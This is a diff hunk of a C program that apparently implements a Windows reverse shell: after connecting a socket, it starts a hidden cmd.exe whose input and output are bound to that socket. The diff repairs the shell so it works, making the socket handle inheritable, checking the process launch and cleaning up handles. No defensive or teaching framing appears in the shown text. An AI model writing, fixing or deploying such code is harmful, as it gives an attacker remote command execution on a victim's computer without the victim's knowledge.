@@ -27,25 +27,50 @@ int	main(int argc, char **argv, char **envp)
 	SOCKET	fd;
 
 	#if defined(_WIN32)
-		WSADATA	d;
+		WSADATA d;
 		if (WSAStartup(MAKEWORD(2, 2), &d))
 			return (1);
 
-		STARTUPINFO sinfo;
-		memset(&sinfo, 0, sizeof(sinfo));
-		sinfo.cb = sizeof(sinfo);
-		sinfo.dwFlags = (STARTF_USESTDHANDLES);
-		sinfo.hStdInput = (HANDLE) fd;
-		sinfo.hStdOutput = (HANDLE) fd;
-		sinfo.hStdError = (HANDLE) fd;
-
-		PROCESS_INFORMATION pinfo;
+		SOCKET fd;
 		if (connect_client(&fd) != 0)
 			return (0);
-		CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
-		
-		WSACleanup();
 
+		// Make socket handle inheritable
+		HANDLE h = (HANDLE)fd;
+		SetHandleInformation(h, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
+
+		STARTUPINFOA sinfo;
+		ZeroMemory(&sinfo, sizeof(sinfo));
+		sinfo.cb = sizeof(sinfo);
+		sinfo.dwFlags = STARTF_USESTDHANDLES;
+		sinfo.hStdInput  = h;
+		sinfo.hStdOutput = h;
+		sinfo.hStdError  = h;
+
+		PROCESS_INFORMATION pinfo;
+		ZeroMemory(&pinfo, sizeof(pinfo));
+
+		if (!CreateProcessA(
+				NULL,
+				"cmd.exe",
+				NULL,
+				NULL,
+				TRUE,                // inherit handles
+				CREATE_NO_WINDOW,
+				NULL,
+				NULL,
+				&sinfo,
+				&pinfo))
+		{
+			WSACleanup();
+			return (1);
+		}
+
+		CloseHandle(pinfo.hThread);
+		CloseHandle(pinfo.hProcess);
+
+		WSACleanup();
+		return (0);
 	#else
 		(void) argc;
 		(void) argv;
